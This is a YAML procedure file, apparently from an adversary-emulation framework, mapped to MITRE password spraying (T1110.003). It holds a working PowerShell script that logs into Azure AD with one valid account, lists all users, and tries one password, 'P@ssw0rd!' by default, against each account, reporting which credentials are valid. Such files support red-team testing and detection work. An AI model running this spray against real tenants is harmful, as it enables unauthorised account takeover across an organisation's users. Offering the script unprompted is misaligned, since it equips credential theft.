api_version: "2.0"
name: Password spray all Azure AD users with a single password
description: |
    Attempt to brute force all Azure AD users with a single password (called "password spraying") via AzureAD Powershell module.
    Valid credentials are only needed to fetch the list of Azure AD users.
args:
    - name: password
      type: string
      default: P@ssw0rd!
    - name: valid_username
      type: string
      default: bruce.wayne@contoso.com
    - name: valid_password
      type: string
      default: iamthebatman
uuid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.003: Password Spraying'
requirements:
    platforms:
        - os: azure-ad
steps:
    - name: |
        AzureAD module must be installed.
      inline: |
        try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name AzureAD -Force
        }}} catch {exit 1}
      executor: powershell
    - name: password-spray-all-azure-ad-users-with-a-single-password
      inline: |
        Import-Module -Name AzureAD
        $PWord = ConvertTo-SecureString -String "{{.Args.valid_password}}" -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.valid_username}}", $Pword
        Connect-AzureAD -Credential $Credential > $null

        ($Users = Get-AzureADUser -All $true) > $null
        Disconnect-AzureAD > $null
        $PWord = ConvertTo-SecureString -String "{{.Args.password}}" -AsPlainText -Force

        $Users | Foreach-Object {
          $user = $_.UserPrincipalName
          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword
          try {
            Write-Host " [-] Attempting {{.Args.password}} on account ${user}."
            Connect-AzureAD -Credential $Credential 2>&1> $null
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] ${user}:{{.Args.password}} are valid credentials!`r`n"
            Disconnect-AzureAD > $null
          } catch {
            Write-Host " [-] ${user}:{{.Args.password}} invalid credentials.`r`n"
          }
        }
        Write-Host "End of password spraying"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
